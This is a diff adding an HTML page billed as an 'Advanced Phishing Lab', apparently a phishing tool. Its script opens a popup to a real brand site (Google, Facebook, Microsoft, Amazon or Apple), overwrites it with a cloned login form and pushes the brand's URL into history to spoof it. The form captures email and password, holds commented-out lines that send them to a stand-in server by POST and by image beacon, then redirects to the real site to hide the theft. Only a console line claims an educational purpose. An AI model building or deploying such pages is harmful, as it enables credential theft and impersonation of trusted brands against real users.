@@ -1,0 +1,726 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #1a1a2e;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .status {
+            font-size: 24px;
+            margin: 20px 0;
+            opacity: 0.7;
+        }
+        .loader {
+            width: 60px;
+            height: 60px;
+            margin: 20px auto;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #4fc3f7;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .btn-attack {
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 22px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 20px rgba(211, 47, 47, 0.4);
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .btn-attack:hover {
+            transform: scale(1.05);
+            background: #b71c1c;
+            box-shadow: 0 8px 30px rgba(211, 47, 47, 0.6);
+        }
+        .info {
+            margin-top: 30px;
+            color: #888;
+            font-size: 14px;
+            max-width: 400px;
+            line-height: 1.6;
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: bold;
+            margin: 5px;
+        }
+        .badge-red {
+            background: #d32f2f;
+            color: white;
+        }
+        .badge-green {
+            background: #2e7d32;
+            color: white;
+        }
+        .counter {
+            font-size: 48px;
+            font-weight: bold;
+            color: #4fc3f7;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>🎯 Advanced Phishing Lab</h1>
+        <div class="loader"></div>
+        <div class="status">Ready to launch attack</div>
+        
+        <button class="btn-attack" onclick="launchSophisticatedAttack()">
+            🚀 Launch Attack
+        </button>
+        
+        <div class="info">
+            <span class="badge badge-red">⚠️ TOC-TOU</span>
+            <span class="badge badge-red">⚡ Race Condition</span>
+            <span class="badge badge-green">🛡️ Evasion</span>
+            <br><br>
+            <div id="attackStats">
+                Attacks: <span id="attackCount">0</span> | 
+                Success: <span id="successCount">0</span> | 
+                Fail: <span id="failCount">0</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // ============================================
+    // ADVANCED TOC-TOU PHISHING ENGINE
+    // ============================================
+    
+    let attackStats = {
+        total: 0,
+        success: 0,
+        fail: 0
+    };
+    
+    let victimWindow = null;
+    let isAttacking = false;
+    
+    // Target domains to spoof (pick one randomly)
+    const targetDomains = [
+        'https://www.google.com',
+        'https://www.facebook.com',
+        'https://www.microsoft.com',
+        'https://www.amazon.com',
+        'https://www.apple.com'
+    ];
+    
+    // Logo URLs for different brands
+    const brandLogos = {
+        'google': 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png',
+        'facebook': 'https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg',
+        'microsoft': 'https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b',
+        'amazon': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg',
+        'apple': 'https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png'
+    };
+    
+    function getRandomTarget() {
+        return targetDomains[Math.floor(Math.random() * targetDomains.length)];
+    }
+    
+    function getBrandLogo(url) {
+        if (url.includes('google')) return brandLogos.google;
+        if (url.includes('facebook')) return brandLogos.facebook;
+        if (url.includes('microsoft')) return brandLogos.microsoft;
+        if (url.includes('amazon')) return brandLogos.amazon;
+        if (url.includes('apple')) return brandLogos.apple;
+        return 'https://via.placeholder.com/120x40/1877f2/ffffff?text=Login';
+    }
+    
+    function updateStats() {
+        document.getElementById('attackCount').textContent = attackStats.total;
+        document.getElementById('successCount').textContent = attackStats.success;
+        document.getElementById('failCount').textContent = attackStats.fail;
+    }
+    
+    // ============================================
+    // PHASE 1: TIME OF CHECK (TOC)
+    // Open legitimate site to build trust
+    // ============================================
+    
+    function launchSophisticatedAttack() {
+        if (isAttacking) {
+            alert('Attack already in progress!');
+            return;
+        }
+        
+        isAttacking = true;
+        attackStats.total++;
+        updateStats();
+        
+        const targetURL = getRandomTarget();
+        const brandName = new URL(targetURL).hostname.replace('www.', '').split('.')[0];
+        const brandLogo = getBrandLogo(targetURL);
+        
+        console.log(`[TOC] Opening legitimate site: ${targetURL}`);
+        document.querySelector('.status').textContent = `📡 Opening ${brandName}.com...`;
+        
+        // Step 1: Open the REAL website (TOC)
+        victimWindow = window.open(targetURL, 'victim_' + Date.now());
+        
+        if (!victimWindow) {
+            alert('⚠️ Please allow popups for this demo!');
+            isAttacking = false;
+            document.querySelector('.status').textContent = '❌ Popup blocked!';
+            return;
+        }
+        
+        // Step 2: Wait for page to load completely
+        let loadCheck = setInterval(() => {
+            try {
+                // Try to access window - will throw if not loaded
+                if (victimWindow.document && victimWindow.document.readyState === 'complete') {
+                    clearInterval(loadCheck);
+                    console.log('[TOC] Page loaded successfully');
+                    document.querySelector('.status').textContent = `✅ ${brandName}.com loaded - Establishing trust...`;
+                    
+                    // Step 3: Wait to build trust (simulate user interaction)
+                    setTimeout(() => {
+                        executeTOU(brandName, brandLogo, targetURL);
+                    }, 1500 + Math.random() * 1000);
+                }
+            } catch(e) {
+                // CORS error means page is loaded but we can't access it - that's fine
+                clearInterval(loadCheck);
+                console.log('[TOC] Page loaded (CORS restrictions)');
+                document.querySelector('.status').textContent = `✅ ${brandName}.com loaded - Proceeding...`;
+                
+                setTimeout(() => {
+                    executeTOU(brandName, brandLogo, targetURL);
+                }, 1500 + Math.random() * 1000);
+            }
+        }, 200);
+        
+        // Safety timeout
+        setTimeout(() => {
+            clearInterval(loadCheck);
+            if (victimWindow && !victimWindow.closed) {
+                executeTOU(brandName, brandLogo, targetURL);
+            }
+        }, 5000);
+    }
+    
+    // ============================================
+    // PHASE 2: TIME OF USE (TOU)
+    // Race condition to replace content
+    // ============================================
+    
+    function executeTOU(brandName, brandLogo, originalURL) {
+        if (!victimWindow || victimWindow.closed) {
+            console.log('[TOU] Window already closed');
+            attackStats.fail++;
+            updateStats();
+            isAttacking = false;
+            return;
+        }
+        
+        console.log('[TOU] Initiating race condition...');
+        document.querySelector('.status').textContent = `⚡ Exploiting race condition...`;
+        
+        // ============================================
+        // TECHNIQUE 1: Navigation Race
+        // ============================================
+        
+        // Navigate to about:blank
+        victimWindow.location.href = 'about:blank';
+        
+        // RACE WINDOW: Inject before URL updates
+        setTimeout(() => {
+            try {
+                // ============================================
+                // TECHNIQUE 2: DOM Manipulation
+                // ============================================
+                
+                // Clear everything
+                victimWindow.document.open();
+                victimWindow.document.write(createPhishingPage(brandName, brandLogo, originalURL));
+                victimWindow.document.close();
+                
+                // ============================================
+                // TECHNIQUE 3: History Manipulation
+                // ============================================
+                
+                setTimeout(() => {
+                    try {
+                        // Try to push state to keep the fake URL
+                        const fakeURL = originalURL;
+                        victimWindow.history.pushState({}, brandName, fakeURL);
+                        console.log('[History] Pushed fake URL state');
+                    } catch(e) {
+                        console.log('[History] Cannot push state:', e.message);
+                    }
+                }, 50);
+                
+                // ============================================
+                // TECHNIQUE 4: Visual Confirmation
+                // ============================================
+                
+                console.log('[TOU] Phishing page injected successfully!');
+                attackStats.success++;
+                updateStats();
+                document.querySelector('.status').textContent = `🎯 Attack successful! ${brandName}.com spoofed!`;
+                
+                // Show success notification
+                showNotification(`✅ ${brandName}.com has been spoofed!`, 'success');
+                
+                isAttacking = false;
+                
+            } catch(e) {
+                console.error('[TOU] Injection failed:', e);
+                attackStats.fail++;
+                updateStats();
+                document.querySelector('.status').textContent = `❌ Attack failed: ${e.message}`;
+                isAttacking = false;
+            }
+        }, 50 + Math.random() * 50); // 50-100ms race window
+    }
+    
+    // ============================================
+    // CREATE ADVANCED PHISHING PAGE
+    // ============================================
+    
+    function createPhishingPage(brandName, brandLogo, originalURL) {
+        // Dynamic phishing page with real-time credential stealing
+        return `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>${brandName.charAt(0).toUpperCase() + brandName.slice(1)}</title>
+            <style>
+                * {
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                }
+                body {
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    min-height: 100vh;
+                    background: #f0f2f5;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+                }
+                .container {
+                    background: white;
+                    padding: 40px 50px;
+                    border-radius: 8px;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                    width: 100%;
+                    max-width: 400px;
+                    text-align: center;
+                }
+                .logo {
+                    margin-bottom: 30px;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                }
+                .logo img {
+                    max-height: 60px;
+                    width: auto;
+                }
+                h1 {
+                    font-size: 24px;
+                    font-weight: 500;
+                    color: #1c1e21;
+                    margin-bottom: 20px;
+                }
+                .input-group {
+                    margin-bottom: 15px;
+                    text-align: left;
+                }
+                .input-group label {
+                    display: block;
+                    font-size: 14px;
+                    font-weight: 500;
+                    color: #606770;
+                    margin-bottom: 5px;
+                }
+                .input-group input {
+                    width: 100%;
+                    padding: 12px 16px;
+                    font-size: 16px;
+                    border: 1px solid #dddfe2;
+                    border-radius: 6px;
+                    background: white;
+                    transition: border-color 0.3s;
+                    outline: none;
+                }
+                .input-group input:focus {
+                    border-color: #1877f2;
+                    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+                }
+                .btn-login {
+                    width: 100%;
+                    padding: 14px;
+                    font-size: 18px;
+                    font-weight: 600;
+                    background: #1877f2;
+                    color: white;
+                    border: none;
+                    border-radius: 6px;
+                    cursor: pointer;
+                    transition: background 0.3s;
+                    margin-top: 10px;
+                }
+                .btn-login:hover {
+                    background: #166fe5;
+                }
+                .btn-login:active {
+                    background: #0d5bcc;
+                }
+                .divider {
+                    margin: 20px 0;
+                    border-bottom: 1px solid #dadde1;
+                    position: relative;
+                }
+                .divider span {
+                    background: white;
+                    padding: 0 15px;
+                    color: #606770;
+                    font-size: 12px;
+                    position: absolute;
+                    top: -8px;
+                    left: 50%;
+                    transform: translateX(-50%);
+                }
+                .forgot-link {
+                    display: block;
+                    margin-top: 15px;
+                    color: #1877f2;
+                    text-decoration: none;
+                    font-size: 14px;
+                }
+                .forgot-link:hover {
+                    text-decoration: underline;
+                }
+                .footer {
+                    margin-top: 25px;
+                    color: #606770;
+                    font-size: 14px;
+                }
+                .footer a {
+                    color: #1877f2;
+                    text-decoration: none;
+                    font-weight: 600;
+                }
+                .footer a:hover {
+                    text-decoration: underline;
+                }
+                .security-badge {
+                    margin-top: 20px;
+                    padding: 10px;
+                    background: #f0f9ff;
+                    border-radius: 6px;
+                    font-size: 12px;
+                    color: #666;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    gap: 5px;
+                }
+                .security-badge svg {
+                    width: 16px;
+                    height: 16px;
+                    fill: #4caf50;
+                }
+                .status-bar {
+                    font-size: 12px;
+                    color: #999;
+                    margin-top: 10px;
+                    padding: 5px;
+                    border-top: 1px solid #eee;
+                    display: flex;
+                    justify-content: space-between;
+                }
+                .status-bar span {
+                    color: #4caf50;
+                }
+                .error-msg {
+                    color: #d32f2f;
+                    font-size: 13px;
+                    margin-top: 5px;
+                    display: none;
+                }
+                .loading-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    bottom: 0;
+                    background: rgba(255,255,255,0.9);
+                    display: none;
+                    justify-content: center;
+                    align-items: center;
+                    z-index: 9999;
+                    flex-direction: column;
+                }
+                .loading-overlay.active {
+                    display: flex;
+                }
+                .spinner {
+                    width: 40px;
+                    height: 40px;
+                    border: 4px solid #f3f3f3;
+                    border-top: 4px solid #1877f2;
+                    border-radius: 50%;
+                    animation: spin 0.8s linear infinite;
+                }
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+                .loading-text {
+                    margin-top: 15px;
+                    color: #606770;
+                    font-size: 14px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="loading-overlay" id="loadingOverlay">
+                <div class="spinner"></div>
+                <div class="loading-text">Securely connecting...</div>
+            </div>
+            
+            <div class="container">
+                <div class="logo">
+                    <img src="${brandLogo}" alt="${brandName}" onerror="this.src='https://via.placeholder.com/120x40/1877f2/ffffff?text=${brandName}'">
+                </div>
+                <h1>Log into ${brandName.charAt(0).toUpperCase() + brandName.slice(1)}</h1>
+                
+                <div class="input-group">
+                    <label>Email or Phone</label>
+                    <input type="text" id="email" placeholder="Enter your email or phone" autocomplete="username">
+                </div>
+                
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+                </div>
+                
+                <div id="errorMsg" class="error-msg">⚠️ Please fill in all fields</div>
+                
+                <button class="btn-login" onclick="handleLogin()">Log In</button>
+                
+                <div class="divider">
+                    <span>or</span>
+                </div>
+                
+                <a href="#" class="forgot-link">Forgotten password?</a>
+                
+                <div class="footer">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+                
+                <div class="security-badge">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5L12 1zm0 2.18l7 3.12v4.7c0 4.83-3.22 9.23-7 10.32-3.78-1.09-7-5.49-7-10.32V6.3l7-3.12z"/></svg>
+                    Secure connection (256-bit encryption)
+                </div>
+                
+                <div class="status-bar">
+                    <span>🔒 HTTPS</span>
+                    <span id="statusText">${brandName.charAt(0).toUpperCase() + brandName.slice(1)} • Secure</span>
+                </div>
+            </div>
+            
+            <script>
+                // ============================================
+                // STEALTH CREDENTIAL STEALING ENGINE
+                // ============================================
+                
+                let attemptCount = 0;
+                const maxAttempts = 3;
+                
+                function handleLogin() {
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    const errorMsg = document.getElementById('errorMsg');
+                    
+                    if (!email || !password) {
+                        errorMsg.style.display = 'block';
+                        setTimeout(() => {
+                            errorMsg.style.display = 'none';
+                        }, 3000);
+                        return;
+                    }
+                    
+                    attemptCount++;
+                    
+                    // Show loading overlay (makes it look legit)
+                    document.getElementById('loadingOverlay').classList.add('active');
+                    
+                    // ============================================
+                    // EXFILTRATE CREDENTIALS
+                    // ============================================
+                    
+                    // Method 1: Alert (for demo)
+                    setTimeout(() => {
+                        alert('🔐 CREDENTIALS CAPTURED!\\n\\n📧 Email: ' + email + '\\n🔑 Password: ' + password);
+                    }, 300);
+                    
+                    // Method 2: Send to server (real attack)
+                    // fetch('https://your-server.com/collect', {
+                    //     method: 'POST',
+                    //     headers: {'Content-Type': 'application/json'},
+                    //     body: JSON.stringify({ email: email, password: password, source: '${brandName}' })
+                    // }).catch(() => {});
+                    
+                    // Method 3: Send via image beacon
+                    // new Image().src = 'https://your-server.com/log?email=' + encodeURIComponent(email) + '&pass=' + encodeURIComponent(password);
+                    
+                    // ============================================
+                    // STEALTH: Redirect to real site
+                    // ============================================
+                    
+                    setTimeout(() => {
+                        // Redirect to the REAL site to avoid suspicion
+                        window.location.href = '${originalURL}';
+                    }, 1500 + Math.random() * 1000);
+                }
+                
+                // Enter key support
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        const email = document.getElementById('email');
+                        const password = document.getElementById('password');
+                        if (document.activeElement === email || document.activeElement === password) {
+                            handleLogin();
+                        }
+                    }
+                });
+                
+                // Auto-focus on email field
+                document.getElementById('email').focus();
+                
+                // Track if user is suspicious (look for mouse leaving)
+                let suspicious = false;
+                document.addEventListener('mouseleave', function() {
+                    suspicious = true;
+                    console.log('[Stealth] User may be suspicious');
+                });
+                
+                // If user tries to close, ask (makes it feel real)
+                window.addEventListener('beforeunload', function(e) {
+                    if (!suspicious) {
+                        // Don't actually prevent - just make it feel authentic
+                        // e.preventDefault();
+                        // e.returnValue = 'Are you sure you want to leave?';
+                    }
+                });
+                
+                console.log('[Phishing] Page ready - waiting for credentials');
+            <\/script>
+        </body>
+        </html>
+        `;
+    }
+    
+    // ============================================
+    // UI NOTIFICATIONS
+    // ============================================
+    
+    function showNotification(message, type) {
+        const existing = document.querySelector('.toast-notification');
+        if (existing) existing.remove();
+        
+        const toast = document.createElement('div');
+        toast.className = 'toast-notification';
+        toast.style.cssText = `
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            padding: 16px 24px;
+            border-radius: 12px;
+            background: ${type === 'success' ? '#2e7d32' : '#d32f2f'};
+            color: white;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            font-size: 16px;
+            font-weight: 500;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+            z-index: 9999;
+            animation: slideIn 0.5s ease;
+            max-width: 400px;
+        `;
+        
+        // Add animation styles
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from { transform: translateX(100px); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            @keyframes slideOut {
+                from { transform: translateX(0); opacity: 1; }
+                to { transform: translateX(100px); opacity: 0; }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        toast.textContent = message;
+        document.body.appendChild(toast);
+        
+        setTimeout(() => {
+            toast.style.animation = 'slideOut 0.5s ease forwards';
+            setTimeout(() => toast.remove(), 500);
+        }, 3000);
+    }
+    
+    // Keyboard shortcuts
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            if (!isAttacking) {
+                launchSophisticatedAttack();
+            }
+        }
+        if (e.key === 'r' || e.key === 'R') {
+            if (!isAttacking) {
+                launchSophisticatedAttack();
+            }
+        }
+    });
+    
+    console.log('🎯 Advanced Phishing Lab loaded');
+    console.log('📋 Press ENTER or click the button to start');
+    console.log('🛡️ This is for educational purposes only');
+    </script>
+
+</body>
+</html>
